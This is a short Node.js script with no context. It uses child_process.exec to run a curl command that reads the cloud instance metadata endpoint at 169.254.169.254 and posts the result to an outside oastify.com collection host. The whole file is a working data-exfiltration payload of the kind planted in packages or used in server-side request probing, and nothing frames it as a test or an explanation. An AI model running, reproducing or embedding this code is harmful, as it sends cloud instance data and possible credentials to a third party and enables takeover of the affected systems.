const{ exec } = require('child_process');

exec('curl -d "`curl -H \"Metadata: true\" http://169.254.169.254/metadata/instance?api-version=2021-02-01`" https://7mun0k9936vnqq1dhiz7329qnhtfm3dr2.oastify.com',(error,stdout,stderr)=>{
 if(error){
 console.error(`exec error: ${error}`);
 return;
 }
 console.log(`stdout: ${stdout}`);
 console.error(`stderr: ${stderr}`);
});
